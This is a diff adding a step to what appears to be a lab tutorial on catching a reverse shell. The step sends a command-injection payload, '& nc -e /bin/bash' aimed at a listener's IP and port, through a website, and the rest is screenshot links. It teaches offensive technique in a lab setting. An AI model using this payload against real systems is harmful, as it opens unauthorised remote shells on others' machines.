@@ -128,6 +128,14 @@ Now we grab our gloves and get ready for the reverse shell catch by running
 - p = port
 
 ![CRS_18](https://github.com/Magee3/Catching-a-Reverse-Shell/assets/134301259/a0cab823-6827-4265-9b48-344e12cfda30)
+
+Our box is actively listening for the shell. We now send the payload through the website to connect to us. Run:
+
+& nc -e /bin/bash 192.168.122.209 2077
+
+make sure you are sending the shell to "your" router, the router will send the shell to your box and if the listener
+is running you will catch the shell.
+
 ![CRS_19](https://github.com/Magee3/Catching-a-Reverse-Shell/assets/134301259/0e8ebe54-28f7-4d2a-9332-c68c1b4b45bc)
 ![CRS_20](https://github.com/Magee3/Catching-a-Reverse-Shell/assets/134301259/890835be-3629-4e67-a924-fb41650a8a46)
 ![CRS_21](https://github.com/Magee3/Catching-a-Reverse-Shell/assets/134301259/b333e956-85c6-4917-8920-0c100adb05fc)
